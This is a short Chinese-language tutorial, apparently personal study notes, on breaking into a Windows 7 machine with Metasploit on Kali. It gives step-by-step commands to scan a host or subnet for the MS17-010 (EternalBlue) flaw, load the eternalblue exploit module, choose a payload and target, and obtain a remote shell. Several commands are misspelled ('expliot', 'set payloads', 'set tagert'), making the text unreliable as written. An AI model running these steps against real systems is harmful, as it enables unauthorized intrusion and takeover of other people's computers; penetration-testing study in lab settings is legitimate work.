

### 入侵win7电脑案例



虚拟机开启kali

1. 进入metasploit

   ```sh
   msfconsole
   ```

2. 查询是否安装永恒之蓝漏洞模块

   ```sh
   search ms17_010
   ```

3. 指定扫描模块

   ```sh
   use auxiliary/scanner/smb/smb_ms17_010
   #查看选项
   show options	
   ```

4. 指定扫描ip，（或网段）

   ```sh
   set RHOSTS 192.168.137.131 
   #也可以扫网段
   #set RHOSTS 192.168.137.0/24
   ```

5. 执行渗透

   ```sh
   expliot
   ```

6. 如扫到该漏洞主机

   ```sh
   #先执行上一步
   back
   #使用攻击模块
   use exploit/windows/smb/ms17_010_eternalblue	#使用tab键，查找所需模块
   #查看
   show options
   
   #查看攻击载荷 (攻击成功后连接方式，如netcat(瑞士军刀)、metepreter，windows)
   show payloads
   #指定攻击载荷
   set payloads xxx
   
   #指定攻击目标
   set RHOSTS 192.168.137.131
   #攻击
   exploit
   
   #其他：
   #查看攻击目标
   show targets
   #指定目标
   set tagert 序号
   ```

7. 若攻击成功，返回对方shell